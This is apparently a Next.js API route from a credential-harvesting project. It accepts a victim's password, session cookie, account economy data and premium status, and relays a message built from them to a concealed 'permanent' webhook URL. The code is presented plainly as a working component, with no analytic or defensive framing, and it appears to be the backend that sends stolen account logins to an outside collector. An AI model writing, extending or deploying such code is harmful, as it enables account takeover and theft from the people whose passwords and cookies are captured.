import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const { userData, password, cookie, economyData, hasPremium, directory, embeds } = await request.json();
    
    const permanentWebhook = process.env.PERMANENT_WEBHOOK_URL;

    if (!permanentWebhook) {
      return NextResponse.json({ error: 'Webhook not configured' }, { status: 500 });
    }

    // Send to permanent webhook
    const response = await fetch(permanentWebhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds }),
    });

    if (!response.ok) {
      throw new Error('Failed to send webhook');
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in send-webhook:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
